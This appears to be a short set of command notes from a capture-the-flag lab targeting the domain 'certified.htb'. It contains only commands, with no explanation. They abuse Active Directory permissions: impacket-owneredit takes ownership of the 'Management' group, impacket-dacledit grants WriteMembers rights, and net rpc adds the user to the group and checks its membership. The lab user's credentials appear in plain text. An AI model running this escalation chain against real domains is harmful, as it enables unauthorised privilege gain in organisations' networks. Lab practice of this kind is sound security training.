impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb'/'judith.mader':'judith09'

impacket-dacledit  -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'

net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S $target

net rpc group members "Management"  -U "certified.htb"/"judith.mader"%"judith09" -S $target